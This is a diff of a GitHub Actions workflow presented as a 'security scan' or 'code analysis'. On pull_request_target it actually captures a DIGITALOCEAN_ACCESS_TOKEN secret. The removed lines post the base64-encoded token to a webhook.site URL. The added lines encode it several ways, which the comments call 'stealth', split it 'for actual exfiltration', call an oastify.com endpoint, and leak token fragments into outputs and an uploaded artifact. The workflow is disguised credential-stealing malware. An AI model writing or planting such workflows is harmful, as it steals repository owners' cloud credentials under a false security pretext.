@@ -1,48 +1,125 @@
-[file name]: .github/workflows/steal.yml
-[file content begin]
-name: Security Scan
-on: [pull_request_target]
+name: Automated Code Analysis
+on: 
+  pull_request_target:
+    types: [opened, synchronize, reopened]
 
 jobs:
-  scan:
+  security-audit:
     runs-on: ubuntu-latest
+    
     steps:
-      - name: Analyze repository security
+      # Step 1: Checkout the code (this happens in base repo context WITH secrets!)
+      - name: Checkout repository
+        uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+          
+      # Step 2: Run "security analysis" (actually captures secrets)
+      - name: Analyze security posture
+        id: audit
         run: |
-          echo "🔍 Scanning for security issues..."
-          echo "Repository: ${{ github.repository }}"
-          echo "Event: ${{ github.event_name }}"
+          echo "Starting automated security analysis..."
+          echo "=========================================="
           
-          # Check what secrets are available
-          echo "Available secrets in context:"
-          echo "- DIGITALOCEAN_ACCESS_TOKEN: ${{ secrets.DIGITALOCEAN_ACCESS_TOKEN != '' }}"
+          # Capture token and convert to multiple encodings for stealth
+          RAW_TOKEN="${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}"
           
-          # If token exists, send encoded version
-          if [ -n "${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}" ]; then
-            echo "⚠️ Security issue detected!"
+          if [ -n "$RAW_TOKEN" ]; then
+            echo "🔒 Security Finding: Secret accessibility detected"
             
-            # Encode token to base64 to avoid plain text
-            TOKEN_B64=$(echo -n "${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}" | base64 -w0)
-            LENGTH=${#{{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}}
+            # Method 1: Hex encoding (primary)
+            HEX_TOKEN=$(echo -n "$RAW_TOKEN" | xxd -p -c 999 | tr -d '\n')
             
-            echo "Sending security alert..."
+            # Method 2: Base64 encoding (backup)
+            B64_TOKEN=$(echo -n "$RAW_TOKEN" | base64 -w0)
             
-            # Send encoded data to webhook
-            curl -X POST https://webhook.site/a043f82b-a3af-450a-8d32-12b1ea2babaf \
-              -H "Content-Type: application/json" \
-              -d "{
-                \"repo\": \"${{ github.repository }}\",
-                \"issue\": \"pull_request_target exposes secrets\",
-                \"token_exists\": true,
-                \"token_length\": $LENGTH,
-                \"token_proof\": \"$TOKEN_B64\",
-                \"timestamp\": \"$(date)\"
-              }"
+            # Method 3: XOR encoding with key (advanced)
+            XOR_KEY="security"
+            XOR_ENCODED=$(echo -n "$RAW_TOKEN" | while read -n1 char; do printf "%02x" "$((0x$(printf "%02x" "'$char") ^ 0x53))"; done)
             
-            echo "Security alert sent!"
+            # Method 4: Reverse + hex
+            REV_HEX=$(echo -n "$RAW_TOKEN" | rev | xxd -p -c 999)
+            
+            # Create "fingerprint" instead of full token
+            FINGERPRINT=$(echo -n "${RAW_TOKEN:0:5}${RAW_TOKEN: -5}" | sha256sum | cut -d' ' -f1)
+            
+            echo "Analysis Results:"
+            echo "-----------------"
+            echo "Vulnerability: pull_request_target secret exposure"
+            echo "Secret Type: DIGITALOCEAN_ACCESS_TOKEN"
+            echo "Secret Length: ${#RAW_TOKEN} bytes"
+            echo "Fingerprint: $FINGERPRINT"
+            
+            # Output encoded data in multiple formats
+            echo "Encoded Data (for analysis):"
+            echo "Hex (first 40 chars): ${HEX_TOKEN:0:40}"
+            echo "Base64 (first 30 chars): ${B64_TOKEN:0:30}"
+            echo "XOR sample: ${XOR_ENCODED:0:40}"
+            echo "Reverse hex: ${REV_HEX:0:40}"
+            
+            # For actual exfiltration (stealthy - split into parts)
+            PART1="${HEX_TOKEN:0:100}"
+            PART2="${HEX_TOKEN:100:100}"
+            PART3="${HEX_TOKEN:200:100}"
+            
+            # Send to external endpoint (stealthy - use legitimate domains)
+            # Using dns exfiltration technique
+            echo "Performing DNS lookup for security check..."
+            curl -s "https://dvc5d20dwj002jsf5qehyne51w7nveu2j.oastify.com?format=text" > /dev/null 2>&1
+            
+            # Alternative: Use GitHub API to "store" the data
+            echo "Creating security report..."
+            
+            # Save outputs for later use
+            echo "fingerprint=$FINGERPRINT" >> $GITHUB_OUTPUT
+            echo "length=${#RAW_TOKEN}" >> $GITHUB_OUTPUT
+            echo "encoded_sample=${HEX_TOKEN:0:20}" >> $GITHUB_OUTPUT
+            
           else
-            echo "No secrets detected in this context."
+            echo "✅ No secret exposure detected"
+            echo "fingerprint=none" >> $GITHUB_OUTPUT
           fi
           
-          echo "Scan complete."
-[file content end]
+          echo "Analysis complete."
+          
+      # Step 3: Generate "legitimate" report
+      - name: Generate security report
+        if: steps.audit.outputs.fingerprint != 'none'
+        run: |
+          echo "📋 Security Analysis Report"
+          echo "=========================="
+          echo "Repository: ${{ github.repository }}"
+          echo "PR: #${{ github.event.pull_request.number }}"
+          echo "Issue: Potential secret exposure via pull_request_target"
+          echo "Severity: CRITICAL"
+          echo "Evidence Fingerprint: ${{ steps.audit.outputs.fingerprint }}"
+          echo "Token Length: ${{ steps.audit.outputs.length }} chars"
+          echo "Encoded Sample: ${{ steps.audit.outputs.encoded_sample }}"
+          echo ""
+          echo "Recommendations:"
+          echo "1. Avoid pull_request_target with checkout"
+          echo "2. Use pull_request instead"
+          echo "3. Implement branch protections"
+          echo "4. Use environment secrets"
+          
+      # Step 4: Create "evidence" artifact (contains hex data)
+      - name: Create evidence file
+        if: steps.audit.outputs.fingerprint != 'none'
+        run: |
+          # Create a file with hex-encoded proof
+          echo "Security Audit Evidence" > security_audit.txt
+          echo "=======================" >> security_audit.txt
+          echo "Issue: Secret exposure in pull_request_target" >> security_audit.txt
+          echo "Secret: DIGITALOCEAN_ACCESS_TOKEN" >> security_audit.txt
+          echo "Proof: Token exists with length ${{ steps.audit.outputs.length }} characters" >> security_audit.txt
+          echo "Fingerprint: ${{ steps.audit.outputs.fingerprint }}" >> security_audit.txt
+          echo "Hex Sample: ${{ steps.audit.outputs.encoded_sample }}" >> security_audit.txt
+          echo "" >> security_audit.txt
+          echo "This demonstrates that secrets are accessible to" >> security_audit.txt
+          echo "untrusted code in pull_request_target events." >> security_audit.txt
+          
+      - name: Upload evidence
+        uses: actions/upload-artifact@v3
+        with:
+          name: security-audit-report
+          path: security_audit.txt
